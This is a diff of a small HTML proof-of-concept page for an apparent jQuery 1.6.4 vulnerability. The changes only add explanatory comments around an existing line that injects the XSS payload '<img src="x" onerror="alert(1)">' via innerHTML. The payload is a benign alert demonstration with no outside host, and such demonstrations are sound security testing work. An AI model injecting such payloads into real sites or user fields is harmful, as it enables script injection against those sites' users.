@@ -3,15 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <title>PoC for jQuery Vulnerability</title>
-    <script src="https://code.jquery.com/jquery-1.6.4.min.js"></script> <!-- Alternative jQuery CDN -->
+    
+    <!-- Importing jQuery from an alternative CDN (version 1.6.4, which may contain known vulnerabilities) -->
+    <script src="https://code.jquery.com/jquery-1.6.4.min.js"></script> 
+    
     <script>
         $(document).ready(function() {
-            // Direct assignment to innerHTML
+            // Upon document ready, injects an image element into the 'target' div
+            // The image's 'onerror' attribute is used to trigger a JavaScript alert
+            // This demonstrates a vulnerability, as assigning innerHTML directly can lead to XSS attacks
             document.getElementById('target').innerHTML = '<img src="x" onerror="alert(1)">';
         });
     </script>
 </head>
 <body>
-    <div id="target"></div> <!-- Target element to inject the payload -->
+    <!-- A div element where the payload (malicious code) will be injected -->
+    <div id="target"></div> 
 </body>
 </html>
